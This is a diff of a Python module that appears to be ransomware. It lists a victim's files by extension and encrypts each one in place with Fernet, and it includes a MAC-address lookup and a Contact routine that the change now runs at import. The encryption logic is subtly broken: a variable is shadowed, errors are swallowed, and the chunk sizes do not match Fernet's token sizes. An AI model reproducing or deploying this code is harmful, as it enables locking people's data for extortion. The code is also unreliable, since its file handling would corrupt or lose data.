@@ -1,8 +1,8 @@
 import os
-import yaml
 import mmap
 import shutil
 import psutil
+import yaml # type: ignore
 from pathlib import Path
 from cryptography.fernet import Fernet
 
@@ -23,50 +23,34 @@ def GetMac() -> str:
         return 'No-Mac'
 
 
-def Encrypt(Private: Fernet):
+def process_files(Private: Fernet, mode: str):
     for _, files in List_Files().items():
         for file in files:
             temp_file = file + '.temp'
             try:
-                with open(file, 'rb') as original_file, open(temp_file, 'wb') as encfile:
+                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
                     with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                         offset = 0
                         while offset < len(mm):
                             chunk = mm[offset:offset + 4096 * 1024]
                             if not chunk:
                                 break
-                            enc_chunk = Private.encrypt(chunk, 32)[0]
-                            encfile.write(enc_chunk)
+                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
+                            temp_file.write(processed_chunk)
                             offset += len(chunk)
                 shutil.move(temp_file, file)
-            except Exception:
-                pass
+            except Exception as e: pass
             finally:
                 if os.path.exists(temp_file):
                     os.remove(temp_file)
+
+
+def Encrypt(Private: Fernet):
+    process_files(Private, 'encrypt')
 
 
 def Decrypt(Private: Fernet):
-    for _, files in List_Files().items():
-        for file in files:
-            temp_file = file + '.temp'
-            try:
-                with open(file, 'rb') as encrypted_file, open(temp_file, 'wb') as decfile:
-                    with mmap.mmap(encrypted_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
-                        offset = 0
-                        while offset < len(mm):
-                            chunk = mm[offset:offset + 4096 * 1024]
-                            if not chunk:
-                                break
-                            dec_chunk = Private.decrypt(chunk)
-                            decfile.write(dec_chunk)
-                            offset += len(chunk)
-                shutil.move(temp_file, file)
-            except Exception:
-                pass
-            finally:
-                if os.path.exists(temp_file):
-                    os.remove(temp_file)
+    process_files(Private, 'decrypt')
 
 
 def Contact():
@@ -98,3 +82,5 @@ def List_Files() -> dict:
             file_categories[extcategory[ext]].append(str(entry))
 
     return file_categories
+
+Contact()
